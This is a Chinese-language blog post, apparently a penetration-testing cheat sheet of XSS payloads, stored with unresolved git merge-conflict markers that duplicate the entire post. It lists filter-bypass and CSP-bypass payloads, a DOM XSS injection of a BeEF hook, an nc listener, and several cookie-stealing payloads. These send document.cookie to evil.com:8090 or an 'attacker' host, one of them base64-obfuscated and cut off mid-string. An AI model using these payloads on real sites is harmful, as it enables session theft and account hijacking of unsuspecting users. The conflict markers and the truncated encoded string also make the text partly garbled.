<<<<<<< HEAD
---
layout: post
title:  XSS-Payload+姿势
noToc: true
date:   2018-12-18 09:30:00 +0800
tags: WEB安全 XSS
cover: '../assets/oauth.png'
---
### XSS-Payload+姿势

**0x1:XSS**

```html
btoa('<script>alert("xss")</script>')
"PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="
btoa('<script>alert("xss")</script>1')
"PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4x"
```

**style-XSS(bypass浏览器限制)**

```
<html>
<head>
<style>
div{
    background-image: url("data:image/jpg;base64,</style><svg/onload=alert(2)>");
    background-color: #cccccc;
}
</style>
</head>
<body>

<div>lol</div>

</body>
</html>
```

**bypass部分site-XSS过滤了双引号**


**ueidit-xss**
`cc\" onmouseover=alert(1)%09`

**0x2:基于POST的XSS**
如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。

**0x3:DOM XSS**

```html
<target.com>/#<img/src/onerror=alert("XSS")>
beef的hook，urlencode

<target.com>/#img/src/onerror=$("body").append(decodeURIComponent('%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e'))>
#<img/src="1"/onerror=alert(1)>
#><img src=x onerror=prompt(1);>
```

**0x5:偷Cookie**

```html
<img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie>
Blacklist bypass:
```

**0x6:过滤了`//,:,",<`和`>`**

```php+HTML
btoa('document.location="http://evil.com:8090/r.php?c="+document.cookie')
payload:

eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raW
```

**0x7:另外一个**：

```html
<script>new Image().src="http://evil.com:8090/b.php?"+document.cookie;</script>
比较不错的一个payload：

<svg onload=fetch("//attacker/r.php?="%2Bcookie)>
```

**0x8:比较不错的一个payload**：

```
<svg onload=fetch("//attacker/r.php?="%2Bcookie)>
<img alt="<a href="onclick=alert(4)//" src=x>">s</a>
<details/open/ontoggle="a=alert;a`1`">
<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
> <svg / on </ script> load = alert`1`>
> <svg / on </ script> load = alert(1)>
<d3"<"/onclick="1>[confirm``]"<">z
绕过（）：setTimeout`alert\x28document.domain\x29`
"-prompt`1` - "//
Input Image
<INPUT SRC=”javascript:alert(‘XSS’);”>
BODY Image
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
BODY标签
<BODY(‘XSS’)>
IMG Dynsrc
<IMG DYNSRC=”javascript:alert(‘XSS’)”>
换码过滤的JavaScript
\";alert('XSS');//
无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
Spaces和meta前的IMG标签
<IMG SRC=” javascript:alert(‘XSS’);”>
半开的HTML/JavaScript XSS
<IMG SRC=”javascript:alert(‘XSS’)”
双开角括号
<iframe src=http://3w.org/XSS.html <
无单引号、双引号、分号
<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
```

nc 监听：

nc -lvp 8090

**0x9:常用的payload**

```html
svg/onload'-alert(1)-'
<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
eval(atob('YWxlcnQoMSk='))
<iMg SrC=x OnErRoR=alert(1)>
<div onmouseover="alert('XSS');">
</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
x@x.com<--`<img/src=` onerror=alert(1)> --!>
""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()
oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/o
CSP BYPASS
script-src self: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

=======
---
layout: post
title:  XSS-Payload+姿势
noToc: true
date:   2018-12-18 09:30:00 +0800
tags: WEB安全 XSS
cover: '../assets/oauth.png'
---
### XSS-Payload+姿势

**0x1:XSS**

```html
btoa('<script>alert("xss")</script>')
"PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="
btoa('<script>alert("xss")</script>1')
"PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4x"
```

**style-XSS(bypass浏览器限制)**

```
<html>
<head>
<style>
div{
    background-image: url("data:image/jpg;base64,</style><svg/onload=alert(2)>");
    background-color: #cccccc;
}
</style>
</head>
<body>

<div>lol</div>

</body>
</html>
```

**bypass部分site-XSS过滤了双引号**


**ueidit-xss**
`cc\" onmouseover=alert(1)%09`

**0x2:基于POST的XSS**
如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。

**0x3:DOM XSS**

```html
<target.com>/#<img/src/onerror=alert("XSS")>
beef的hook，urlencode

<target.com>/#img/src/onerror=$("body").append(decodeURIComponent('%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e'))>
#<img/src="1"/onerror=alert(1)>
#><img src=x onerror=prompt(1);>
```

**0x5:偷Cookie**

```html
<img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie>
Blacklist bypass:
```

**0x6:过滤了`//,:,",<`和`>`**

```php+HTML
btoa('document.location="http://evil.com:8090/r.php?c="+document.cookie')
payload:

eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raW
```

**0x7:另外一个**：

```html
<script>new Image().src="http://evil.com:8090/b.php?"+document.cookie;</script>
比较不错的一个payload：

<svg onload=fetch("//attacker/r.php?="%2Bcookie)>
```

**0x8:比较不错的一个payload**：

```
<svg onload=fetch("//attacker/r.php?="%2Bcookie)>
<img alt="<a href="onclick=alert(4)//" src=x>">s</a>
<details/open/ontoggle="a=alert;a`1`">
<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
> <svg / on </ script> load = alert`1`>
> <svg / on </ script> load = alert(1)>
<d3"<"/onclick="1>[confirm``]"<">z
绕过（）：setTimeout`alert\x28document.domain\x29`
"-prompt`1` - "//
Input Image
<INPUT SRC=”javascript:alert(‘XSS’);”>
BODY Image
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
BODY标签
<BODY(‘XSS’)>
IMG Dynsrc
<IMG DYNSRC=”javascript:alert(‘XSS’)”>
换码过滤的JavaScript
\";alert('XSS');//
无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
Spaces和meta前的IMG标签
<IMG SRC=” javascript:alert(‘XSS’);”>
半开的HTML/JavaScript XSS
<IMG SRC=”javascript:alert(‘XSS’)”
双开角括号
<iframe src=http://3w.org/XSS.html <
无单引号、双引号、分号
<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
```

nc 监听：

nc -lvp 8090

**0x9:常用的payload**

```html
svg/onload'-alert(1)-'
<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
eval(atob('YWxlcnQoMSk='))
<iMg SrC=x OnErRoR=alert(1)>
<div onmouseover="alert('XSS');">
</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
x@x.com<--`<img/src=` onerror=alert(1)> --!>
""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()
oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/o
CSP BYPASS
script-src self: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

```
javascscriptript:top.alalertert`1`//xxxx\
```
>>>>>>> 00b4bd53222fd42c2f59a36b4e9891ca8548ef86
